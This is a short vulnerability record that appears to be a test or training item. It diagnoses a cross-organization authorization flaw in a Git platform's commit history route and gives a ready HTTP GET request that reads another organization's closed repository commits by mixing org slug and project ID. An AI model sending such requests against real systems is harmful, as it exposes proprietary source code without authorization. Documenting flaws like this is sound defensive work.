diagnosis: The Git collaboration platform mounts projectRouter on '/orgs/:orgSlug/projects', but the commit history route fetches repository data using only req.params.projectId. It does not check if the repository belongs to orgSlug, nor does it verify that the requesting user is a member of the organization. An attacker can harvest proprietary source code commit logs from other organizations.
exploit_request:
GET /orgs/public-open-source-org/projects/repo_closed_enterprise_991/commits HTTP/1.1
Host: code.dev.internal:4000
Authorization: Bearer <external_developer_token>
Accept: application/json
